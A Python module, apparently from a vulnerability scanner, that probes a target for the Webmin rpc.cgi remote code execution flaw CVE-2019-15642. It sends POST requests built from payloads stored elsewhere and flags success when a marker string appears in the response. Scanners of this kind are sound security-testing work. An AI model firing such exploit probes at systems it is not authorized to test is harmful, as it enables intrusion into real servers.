#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests

def cve_2019_15642_scan(self, url):
    ''' Webmin 1.920及之前版本中的rpc.cgi文件存在安全漏洞, 攻击者可借助特制的对象名称利用该漏洞执行代码
            需要身份验证(Cookie、Authorization等)
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2019-15642'
    vul_info['vul_method'] = 'POST'

    for payload in self.cve_2019_15642_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path

        headers['Referer'] = 'https://{}/session_login.cgi'.format(logger.get_domain(url))

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
